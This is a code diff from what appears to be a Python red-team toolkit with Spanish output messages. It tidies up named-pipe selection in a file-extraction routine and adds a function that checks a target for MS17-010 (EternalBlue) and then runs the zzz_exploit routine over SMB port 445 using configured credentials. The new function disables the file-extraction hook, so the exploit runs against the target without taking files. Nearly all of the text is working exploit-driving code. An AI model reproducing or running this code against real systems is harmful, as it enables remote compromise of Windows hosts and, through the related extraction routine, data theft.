@@ -155,11 +155,9 @@ def ejecutar_extraccion(os_name=None):
         "netlogon",
         "wkssvc",
     ]
-    if checker["pipes"]:
-        pipe = checker["pipes"][0]
-    else:
+    pipe = checker["pipes"][0] if checker["pipes"] else COMMON_PIPES[0]
+    if not checker["pipes"]:
         print("[*] Enumeración anónima no disponible. Probando pipes comunes...")
-        pipe = COMMON_PIPES[0]
         print(f"[*] Usando pipe por defecto: {pipe}")
 
     print(f"[+] Target: {checker['target_os']} | Pipe: {pipe}")
@@ -183,3 +181,44 @@ def ejecutar_extraccion(os_name=None):
         _ze.do_system_mysmb_session = _original
 
     print("[✅] Extracción completada.")
+
+
+def ejecutar_exploit_sin_exfil(os_name=None):
+    if os_name is None:
+        from config.settings import OS_CHOICE
+
+        os_name = OS_CHOICE
+
+    os_name = seleccionar_os(os_name)
+    cfg = OS_CONFIGS[os_name]
+    target_ip = cfg["TARGET_IP"]
+    smb_user = cfg["SMB_USER"]
+    smb_pass = cfg["SMB_PASS"]
+
+    print(f"[*] SO: {os_name}")
+    print(f"[*] Objetivo: {target_ip}")
+
+    checker = check_vulnerability(target_ip)
+    if not checker["vulnerable"]:
+        print("[❌] Target no vulnerable a MS17-010.")
+        return
+
+    pipe = (checker["pipes"] or ["spoolss"])[0]
+    print(f"[+] Target vulnerable: {checker['target_os']} | Pipe: {pipe}")
+
+    from Agentes.Red.Herramientas import zzz_exploit as _ze
+
+    def _noop_session(conn, pipe_name, share, mode):
+        print("[*] Exploit completado (sin extracción de archivos).")
+
+    _original = _ze.do_system_mysmb_session
+    _ze.do_system_mysmb_session = _noop_session
+
+    try:
+        _ze.exploit(target_ip, 445, smb_user, smb_pass, pipe, "C$", "SHARE")
+    except KeyboardInterrupt:
+        print("\n[!] Interrumpido.")
+    finally:
+        _ze.do_system_mysmb_session = _original
+
+    print("[✅] Exploit MS17-010 completado (sin exfiltración).")
